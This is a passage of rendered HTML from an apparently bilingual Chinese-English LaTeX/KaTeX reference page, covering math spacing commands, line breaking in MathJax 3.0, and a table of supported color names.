mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span></span></span></span> | a;b | 大空格 | large space<br />6 | <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mtext> </mtext><mi>b</mi></mrow><annotation encoding="application/x-tex">a\,b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span></span></span></span> | a,b | 小空格 | small space<br />7 | <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">ab</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span></span></span></span> | ab | 极小空格(用于乘因子) | tiny space (use for multiplication of factors)<br />8 | <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">a b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span></span></span></span> | a b | 极小空格(用于区分其它语法) | tiny space (syntax space ignored)<br />9 | <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">\mathit{ab}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathit">a</span><span class="mord mathit">b</span></span></span></span></span> | \mathit{ab} | 没有空格(用于多字母变量) | no space (use for multi-letter variables)<br />10 | <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mtext> ⁣</mtext><mi>b</mi></mrow><annotation encoding="application/x-tex">a\!b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:-0.16666666666666666em;"></span><span class="mord mathnormal">b</span></span></span></span> | a!b |  负空格 | small negative space</p><h3 id="262-换行-line-breaking"><a class="markdownIt-Anchor" href="#262-换行-line-breaking"></a> 2.6.2 换行 Line breaking</h3><p>在MathJax3.0中取消了使用<code>\\</code>进行强制换行的功能，因此本页面也采取同样的逻辑，默认为单行公式环境。<code>\\</code>强制换行命令只在支持多行编辑的数学环境中才起作用，如<code>eqnarray</code>环境、<code>align</code>环境、<code>array</code>环境、<code>matrix</code>环境等等。如您需要显示多行公式，请在此类环境中输入公式，具体用法参见章节[2.10](#2.10 LaTeX环境 LaTeX environments)。</p><h3 id="274-默认支持颜色-colors-supported"><a class="markdownIt-Anchor" href="#274-默认支持颜色-colors-supported"></a> 2.7.4 默认支持颜色 Colors supported</h3><table><thead><tr><th style="text-align:left">支</th><th style="text-align:left">持</th><th style="text-align:left">颜</th><th style="text-align:left">色</th></tr></thead><tbody><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Apricot"><mi>A</mi><mi>p</mi><mi>r</mi><mi>i</mi><mi>c</mi><mi>o</mi><mi>t</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Apricot}Apricot}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="color:Apricot;">A</span><span class="mord mathnormal" style="color:Apricot;">p</span><span class="mord mathnormal" style="margin-right:0.02778em;color:Apricot;">r</span><span class="mord mathnormal" style="color:Apricot;">i</span><span class="mord mathnormal" style="color:Apricot;">c</span><span class="mord mathnormal" style="color:Apricot;">o</span><span class="mord mathnormal" style="color:Apricot;">t</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Emerald"><mi>E</mi><mi>m</mi><mi>e</mi><mi>r</mi><mi>a</mi><mi>l</mi><mi>d</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Emerald}Emerald}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;color:Emerald;">E</span><span class="mord mathnormal" style="color:Emerald;">m</span><span class="mord mathnormal" style="color:Emerald;">e</span><span class="mord mathnormal" style="margin-right:0.02778em;color:Emerald;">r</span><span class="mord mathnormal" style="color:Emerald;">a</span><span class="mord mathnormal" style="margin-right:0.01968em;color:Emerald;">l</span><span class="mord mathnormal" style="color:Emerald;">d</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="OliveGreen"><mi>O</mi><mi>l</mi><mi>i</mi><mi>v</mi><mi>e</mi><mi>G</mi><mi>r</mi><mi>e</mi><mi>e</mi><mi>n</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{OliveGreen}OliveGreen}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;color:OliveGreen;">O</span><span class="mord mathnormal" style="margin-right:0.01968em;color:OliveGreen;">l</span><span class="mord mathnormal" style="color:OliveGreen;">i</span><span class="mord mathnormal" style="margin-right:0.03588em;color:OliveGreen;">v</span><span class="mord mathnormal" style="color:OliveGreen;">e</span><span class="mord mathnormal" style="color:OliveGreen;">G</span><span class="mord mathnormal" style="margin-right:0.02778em;color:OliveGreen;">r</span><span class="mord mathnormal" style="color:OliveGreen;">e</span><span class="mord mathnormal" style="color:OliveGreen;">e</span><span class="mord mathnormal" style="color:OliveGreen;">n</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="RubineRed"><mi>R</mi><mi>u</mi><mi>b</mi><mi>i</mi><mi>n</mi><mi>e</mi><mi>R</mi><mi>e</mi><mi>d</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{RubineRed}RubineRed}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;color:RubineRed;">R</span><span class="mord mathnormal" style="color:RubineRed;">u</span><span class="mord mathnormal" style="color:RubineRed;">b</span><span class="mord mathnormal" style="color:RubineRed;">i</span><span class="mord mathnormal" style="color:RubineRed;">n</span><span class="mord mathnormal" style="color:RubineRed;">e</span><span class="mord mathnormal" style="margin-right:0.00773em;color:RubineRed;">R</span><span class="mord mathnormal" style="color:RubineRed;">e</span><span class="mord mathnormal" style="color:RubineRed;">d</span></span></span></span></span></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Aquamarine"><mi>A</mi><mi>q</mi><mi>u</mi><mi>a</mi><mi>m</mi><mi>a</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Aquamarine}Aquamarine}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="color:Aquamarine;">A</span><span class="mord mathnormal" style="margin-right:0.03588em;color:Aquamarine;">q</span><span class="mord mathnormal" style="color:Aquamarine;">u</span><span class="mord mathnormal" style="color:Aquamarine;">a</span><span class="mord mathnormal" style="color:Aquamarine;">m</span><span class="mord mathnormal" style="color:Aquamarine;">a</span><span class="mord mathnormal" style="margin-right:0.02778em;color:Aquamarine;">r</span><span class="mord mathnormal" style="color:Aquamarine;">i</span><span class="mord mathnormal" style="color:Aquamarine;">n</span><span class="mord mathnormal" style="color:Aquamarine;">e</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="ForestGreen"><mi>F</mi><mi>o</mi><mi>r</mi><mi>e</mi><mi>s</mi><mi>t</mi><mi>G</mi><mi>r</mi><mi>e</mi><mi>e</mi><mi>n</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{ForestGreen}ForestGreen}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;color:ForestGreen;">F</span><span class="mord mathnormal" style="color:ForestGreen;">o</span><span class="mord mathnormal" style="margin-right:0.02778em;color:ForestGreen;">r</span><span class="mord mathnormal" style="color:ForestGreen;">e</span><span class="mord mathnormal" style="color:ForestGreen;">s</span><span class="mord mathnormal" style="color:ForestGreen;">t</span><span class="mord mathnormal" style="color:ForestGreen;">G</span><span class="mord mathnormal" style="margin-right:0.02778em;color:ForestGreen;">r</span><span class="mord mathnormal" style="color:ForestGreen;">e</span><span class="mord mathnormal" style="color:ForestGreen;">e</span><span class="mord mathnormal" style="color:ForestGreen;">n</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Orange"><mi>O</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Orange}Orange}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;color:Orange;">O</span><span class="mord mathnormal" style="margin-right:0.02778em;color:Orange;">r</span><span class="mord mathnormal" style="color:Orange;">a</span><span class="mord mathnormal" style="color:Orange;">n</span><span class="mord mathnormal" style="margin-right:0.03588em;color:Orange;">g</span><span class="mord mathnormal" style="color:Orange;">e</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Salmon"><mi>S</mi><mi>a</mi><mi>l</mi><mi>m</mi><mi>o</mi><mi>n</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Salmon}Salmon}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;color:Salmon;">S</span><span class="mord mathnormal" style="color:Salmon;">a</span><span class="mord mathnormal" style="margin-right:0.01968em;color:Salmon;">l</span><span class="mord mathnormal" style="color:Salmon;">m</span><span class="mord mathnormal" style="color:Salmon;">o</span><span class="mord mathnormal" style="color:Salmon;">n</span></span></span></span></span></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Bittersweet"><mi>B</mi><mi>i</mi><mi>t</mi><mi>t</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>w</mi><mi>e</mi><mi>e</mi><mi>t</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Bittersweet}Bittersweet}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;color:Bittersweet;">B</span><span class="mord mathnormal" style="color:Bittersweet;">i</span><span class="mord mathnormal" style="color:Bittersweet;">t</span><span class="mord mathnormal" style="color:Bittersweet;">t</span><span class="mord mathnormal" style="color:Bittersweet;">e</span><span class="mord mathnormal" style="margin-right:0.02778em;color:Bittersweet;">r</span><span class="mord mathnormal" style="color:Bittersweet;">s</span><span class="mord mathnormal" style="margin-right:0.02691em;color:Bittersweet;">w</span><span class="mord mathnormal" style="color:Bittersweet;">e</span><span class="mord mathnormal" style="color:Bittersweet;">e</span><span class="mord mathnormal" style="color:Bittersweet;">t</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Fuchsia"><mi>F</mi><mi>u</mi><mi>c</mi><mi>h</mi><mi>s</mi><mi>i</mi><mi>a</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Fuchsia}Fuchsia}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;color:Fuchsia;">F</span><span class="mord mathnormal" style="color:Fuchsia;">u</span><span class="mord mathnormal" style="color:Fuchsia;">c</span><span class="mord mathnormal" style="color:Fuchsia;">h</span><span class="mord mathnormal" style="color:Fuchsia;">s</span><span class="mord mathnormal" style="color:Fuchsia;">i</span><span class="mord mathnormal" style="color:Fuchsia;">a</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="OrangeRed"><mi>O</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>e</mi><mi>R</mi><mi>e</mi><mi>d</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{OrangeRed}OrangeRed}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;color:OrangeRed;">O</span><span class="mord mathnormal" style="margin-right:0.02778em;color:OrangeRed;">r</span><span class="mord mathnormal" style="color:OrangeRed;">a</span><span class="mord mathnormal" style="color:OrangeRed;">n</span><span class="mord mathnormal" style="margin-right:0.03588em;color:OrangeRed;">g</span><span class="mord mathnormal" style="color:OrangeRed;">e</span><span class="mord mathnormal" style="margin-right:0.00773em;color:OrangeRed;">R</span><span class="mord mathnormal" style="color:OrangeRed;">e</span><span class="mord mathnormal" style="color:OrangeRed;">d</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="SeaGreen"><mi>S</mi><mi>e</mi><mi>a</mi><mi>G</mi><mi>r</mi><mi>e</mi><mi>e</mi><mi>n</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{SeaGreen}SeaGreen}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;color:SeaGreen;">S</span><span class="mord mathnormal" style="color:SeaGreen;">e</span><span class="mord mathnormal" style="color:SeaGreen;">a</span><span class="mord mathnormal" style="color:SeaGreen;">G</span><span class="mord mathnormal" style="margin-right:0.02778em;color:SeaGreen;">r</span><span class="mord mathnormal" style="color:SeaGreen;">e</span><span class="mord mathnormal" style="color:SeaGreen;">e</span><span class="mord mathnormal" style="color:SeaGreen;">n</span></span></span></span></span></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Black"><mi>B</mi><mi>l</mi><mi>a</mi><mi>c</mi><mi>k</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Black}Black}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;color:Black;">B</span><span class="mord mathnormal" style="margin-right:0.01968em;color:Black;">l</span><span class="mord mathnormal" style="color:Black;">a</span><span class="mord mathnormal" style="color:Black;">c</span><span class="mord mathnormal" style="margin-right:0.03148em;color:Black;">k</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Goldenrod"><mi>G</mi><mi>o</mi><mi>l</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>r</mi><mi>o</mi><mi>d</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Goldenrod}Goldenrod}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="color:Goldenrod;">G</span><span class="mord mathnormal" style="color:Goldenrod;">o</span><span class="mord mathnormal" style="margin-right:0.01968em;color:Goldenrod;">l</span><span class="mord mathnormal" style="color:Goldenrod;">d</span><span class="mord mathnormal" style="color:Goldenrod;">e</span><span class="mord mathnormal" style="color:Goldenrod;">n</span><span class="mord mathnormal" style="margin-right:0.02778em;color:Goldenrod;">r</span><span class="mord mathnormal" style="color:Goldenrod;">o</span><span class="mord mathnormal" style="color:Goldenrod;">d</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Orchid"><mi>O</mi><mi>r</mi><mi>c</mi><mi>h</mi><mi>i</mi><mi>d</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Orchid}Orchid}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;color:Orchid;">O</span><span class="mord mathnormal" style="margin-right:0.02778em;color:Orchid;">r</span><span class="mord mathnormal" style="color:Orchid;">c</span><span class="mord mathnormal" style="color:Orchid;">h</span><span class="mord mathnormal" style="color:Orchid;">i</span><span class="mord mathnormal" style="color:Orchid;">d</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Sepia"><mi>S</mi><mi>e</mi><mi>p</mi><mi>i</mi><mi>a</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Sepia}Sepia}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;color:Sepia;">S</span><span class="mord mathnormal" style="color:Sepia;">e</span><span class="mord mathnormal" style="color:Sepia;">p</span><span class="mord mathnormal" style="color:Sepia;">i</span><span class="mord mathnormal" style="color:Sepia;">a</span></span></span></span></span></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Blue"><mi>B</mi><mi>l</mi><mi>u</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Blue}Blue}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;color:Blue;">B</span><span class="mord mathnormal" style="margin-right:0.01968em;color:Blue;">l</span><span class="mord mathnormal" style="color:Blue;">u</span><span class="mord mathnormal" style="color:Blue;">e</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Gray"><mi>G</mi><mi>r</mi><mi>a</mi><mi>y</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Gray}Gray}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="color:Gray;">G</span><span class="mord mathnormal" style="margin-right:0.02778em;color:Gray;">r</span><span class="mord mathnormal" style="color:Gray;">a</span><span class="mord mathnormal" style="margin-right:0.03588em;color:Gray;">y</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Peach"><mi>P</mi><mi>e</mi><mi>a</mi><mi>c</mi><mi>h</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Peach}Peach}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;color:Peach;">P</span><span class="mord mathnormal" style="color:Peach;">e</span><span class="mord mathnormal" style="color:Peach;">a</span><span class="mord mathnormal" style="color:Peach;">c</span><span class="mord mathnormal" style="color:Peach;">h</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="SkyBlue"><mi>S</mi><mi>k</mi><mi>y</mi><mi>B</mi><mi>l</mi><mi>u</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{SkyBlue}SkyBlue}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;color:SkyBlue;">S</span><span class="mord mathnormal" style="margin-right:0.03148em;color:SkyBlue;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;color:SkyBlue;">y</span><span class="mord mathnormal" style="margin-right:0.05017em;color:SkyBlue;">B</span><span class="mord mathnormal" style="margin-right:0.01968em;color:SkyBlue;">l</span><span class="mord mathnormal" style="color:SkyBlue;">u</span><span class="mord mathnormal" style="color:SkyBlue;">e</span></span></span></span></span></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="BlueGreen"><mi>B</mi><mi>l</mi><mi>u</mi><mi>e</mi><mi>G</mi><mi>r</mi><mi>e</mi><mi>e</mi><mi>n</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{BlueGreen}BlueGreen}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;color:BlueGreen;">B</span><span class="mord mathnormal" style="margin-right:0.01968em;color:BlueGreen;">l</span><span class="mord mathnormal" style="color:BlueGreen;">u</span><span class="mord mathnormal" style="color:BlueGreen;">e</span><span class="mord mathnormal" style="color:BlueGreen;">G</span><span class="mord mathnormal" style="margin-right:0.02778em;color:BlueGreen;">r</span><span class="mord mathnormal" style="color:BlueGreen;">e</span><span class="mord mathnormal" style="color:BlueGreen;">e</span><span class="mord mathnormal" style="color:BlueGreen;">n</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Green"><mi>G</mi><mi>r</mi><mi>e</mi><mi>e</mi><mi>n</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Green}Green}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="color:Green;">G</span><span class="mord mathnormal" style="margin-right:0.02778em;color:Green;">r</span><span class="mord mathnormal" style="color:Green;">e</span><span class="mord mathnormal" style="color:Green;">e</span><span class="mord mathnormal" style="color:Green;">n</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Periwinkle"><mi>P</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>w</mi><mi>i</mi><mi>n</mi><mi>k</mi><mi>l</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Periwinkle}Periwinkle}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;color:Periwinkle;">P</span><span class="mord mathnormal" style="color:Periwinkle;">e</span><span class="mord mathnormal" style="margin-right:0.02778em;color:Periwinkle;">r</span><span class="mord mathnormal" style="color:Periwinkle;">i</span><span class="mord mathnormal" style="margin-right:0.02691em;color:Periwinkle;">w</span><span class="mord mathnormal" style="color:Periwinkle;">i</span><span class="mord mathnormal" style="color:Periwinkle;">n</span><span class="mord mathnormal" style="margin-right:0.03148em;color:Periwinkle;">k</span><span class="mord mathnormal" style="margin-right:0.01968em;color:Periwinkle;">l</span><span class="mord mathnormal" style="color:Periwinkle;">e</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="SpringGreen"><mi>S</mi><mi>p</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><mi>G</mi><mi>r</mi><mi>e</mi><mi>e</mi><mi>n</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{SpringGreen}SpringGreen}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;color:SpringGreen;">S</span><span class="mord mathnormal" style="color:SpringGreen;">p</span><span class="mord mathnormal" style="margin-right:0.02778em;color:SpringGreen;">r</span><span class="mord mathnormal" style="color:SpringGreen;">i</span><span class="mord mathnormal" style="color:SpringGreen;">n</span><span class="mord mathnormal" style="margin-right:0.03588em;color:SpringGreen;">g</span><span class="mord mathnormal" style="color:SpringGreen;">G</span><span class="mord mathnormal" style="margin-right:0.02778em;color:SpringGreen;">r</span><span class="mord mathnormal" style="color:SpringGreen;">e</span><span class="mord mathnormal" style="color:SpringGreen;">e</span><span class="mord mathnormal" style="color:SpringGreen;">n</span></span></span></span></span></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="BlueViolet"><mi>B</mi><mi>l</mi><mi>u</mi><mi>e</mi><mi>V</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>e</mi><mi>t</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{BlueViolet}BlueViolet}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;color:BlueViolet;">B</span><span class="mord mathnormal" style="margin-right:0.01968em;color:BlueViolet;">l</span><span class="mord mathnormal" style="color:BlueViolet;">u</span><span class="mord mathnormal" style="color:BlueViolet;">e</span><span class="mord mathnormal" style="margin-right:0.22222em;color:BlueViolet;">V</span><span class="mord mathnormal" style="color:BlueViolet;">i</span><span class="mord mathnormal" style="color:BlueViolet;">o</span><span class="mord mathnormal" style="margin-right:0.01968em;color:BlueViolet;">l</span><span class="mord mathnormal" style="color:BlueViolet;">e</span><span class="mord mathnormal" style="color:BlueViolet;">t</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="GreenYellow"><mi>G</mi><mi>r</mi><mi>e</mi><mi>e</mi><mi>n</mi><mi>Y</mi><mi>e</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi>w</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{GreenYellow}GreenYellow}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="color:GreenYellow;">G</span><span class="mord mathnormal" style="margin-right:0.02778em;color:GreenYellow;">r</span><span class="mord mathnormal" style="color:GreenYellow;">e</span><span class="mord mathnormal" style="color:GreenYellow;">e</span><span class="mord mathnormal" style="color:GreenYellow;">n</span><span class="mord mathnormal" style="margin-right:0.22222em;color:GreenYellow;">Y</span><span class="mord mathnormal" style="color:GreenYellow;">e</span><span class="mord mathnormal" style="margin-right:0.01968em;color:GreenYellow;">l</span><span class="mord mathnormal" style="margin-right:0.01968em;color:GreenYellow;">l</span><span class="mord mathnormal" style="color:GreenYellow;">o</span><span class="mord mathnormal" style="margin-right:0.02691em;color:GreenYellow;">w</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="PineGreen"><mi>P</mi><mi>i</mi><mi>n</mi><mi>e</mi><mi>G</mi><mi>r</mi><mi>e</mi><mi>e</mi><mi>n</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{PineGreen}PineGreen}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;color:PineGreen;">P</span><span 